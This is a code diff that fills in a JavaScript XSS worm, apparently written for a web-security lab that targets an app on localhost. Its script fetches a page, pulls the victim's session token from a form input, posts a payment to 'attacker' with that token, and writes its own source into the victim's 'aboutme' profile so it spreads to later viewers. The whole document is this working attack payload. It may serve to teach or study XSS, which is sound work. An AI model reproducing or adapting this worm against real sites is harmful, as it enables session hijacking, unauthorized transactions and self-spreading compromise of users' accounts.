@@ -1,4 +1,21 @@
 <script>
-    var currentScript = document.currentScript.innerTHML;
-    
+    const currentScript = document.currentScript.innerHTML;
+    const req = new XMLHttpRequest();
+    req.addEventListener("load", function () {
+        const frag = document.createElement("div");
+        frag.innerHTML = req.responseText;
+        const token = frag.getElementsByTagName("input")[3].value; //session_token
+
+        const payReq = new XMLHttpRequest(); //pay request
+        payReq.open("POST", "http://localhost:8080/pay", true);
+        payReq.send(`recipient=attacker&amount=1&session_token=${token}`);
+
+        const profileReq = new XMLHttpRequest();
+        const scriptContent = encodeURIComponent(`<script>${currentScript}<\/script>`);
+        profileReq.open("POST", "http://localhost:8080/aboutme", true);
+        profileReq.send(`aboutme=${scriptContent}`);
+    });
+
+    req.open("GET", document.getElementsByTagName("a")[0].href, true);
+    req.send();
 </script>
